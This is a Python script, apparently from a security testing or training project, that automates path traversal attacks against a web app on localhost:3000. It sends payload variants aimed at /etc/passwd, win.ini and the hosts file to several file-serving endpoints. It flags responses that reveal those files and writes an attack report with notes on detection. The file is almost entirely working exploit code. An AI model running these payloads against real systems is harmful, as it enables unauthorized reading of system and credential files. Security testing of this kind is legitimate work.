import requests
import time
import json
import logging
from datetime import datetime
import urllib.parse

class PathTraversalAttacker:
    def __init__(self, target_url="http://localhost:3000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = []
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - PATH_TRAVERSAL - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('../logs/security/path_traversal.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def test_file_downloads(self):
        """Test path traversal in file download functionality"""
        self.logger.info("📁 Testing Path Traversal in File Downloads")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "../../../../windows/win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....\\....\\....\\windows\\win.ini"
        ]
        
        # Test in various endpoints that might handle files
        endpoints = [
            "/rest/product/image?url=",
            "/api/Products/file?path=",
            "/assets/images/"
        ]
        
        for endpoint in endpoints:
            for payload in traversal_payloads:
                try:
                    test_url = f"{self.target_url}{endpoint}{urllib.parse.quote(payload)}"
                    self.logger.info(f"Testing: {payload}")
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    result = {
                        'endpoint': endpoint,
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'sensitive_data_indicated': any(indicator in response.text.lower() 
                                                      for indicator in ['root:', '[extensions]', 'localhost']),
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    if result['sensitive_data_indicated']:
                        self.logger.critical(f"🚨 POSSIBLE PATH TRAVERSAL: {payload}")
                        result['vulnerable'] = True
                    
                    self.results.append(result)
                    time.sleep(0.5)
                    
                except Exception as e:
                    self.logger.error(f"Path traversal test error: {e}")
    
    def generate_report(self):
        """Generate path traversal attack report"""
        total_tests = len(self.results)
        vulnerabilities_found = sum(1 for r in self.results if r.get('vulnerable'))
        
        report = {
            'attack_type': 'Path Traversal',
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'summary': {
                'total_payloads_tested': total_tests,
                'vulnerabilities_found': vulnerabilities_found,
                'success_rate': (vulnerabilities_found / total_tests * 100) if total_tests > 0 else 0
            },
            'detailed_results': self.results,
            'security_implications': [
                "Unauthorized access to sensitive files",
                "System information disclosure",
                "Potential credential theft",
                "Complete system compromise in some cases"
            ],
            'ai_detection_considerations': [
                "Pattern matching for directory traversal sequences",
                "Length and complexity analysis of file paths",
                "Behavioral analysis of file access patterns",
                "Anomaly detection in file request parameters"
            ]
        }
        
        with open('../reports/path_traversal_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        return report
    
    def run_complete_attack(self):
        """Execute complete path traversal attack"""
        self.logger.info("🚀 Starting Path Traversal Attack Simulation")
        
        self.test_file_downloads()
        
        report = self.generate_report()
        
        print(f"\n🔓 PATH TRAVERSAL ATTACK SUMMARY")
        print(f"   Total payloads tested: {report['summary']['total_payloads_tested']}")
        print(f"   Vulnerabilities found: {report['summary']['vulnerabilities_found']}")
        print(f"   Success rate: {report['summary']['success_rate']:.1f}%")
        
        return report

if __name__ == "__main__":
    attacker = PathTraversalAttacker()
    attacker.run_complete_attack()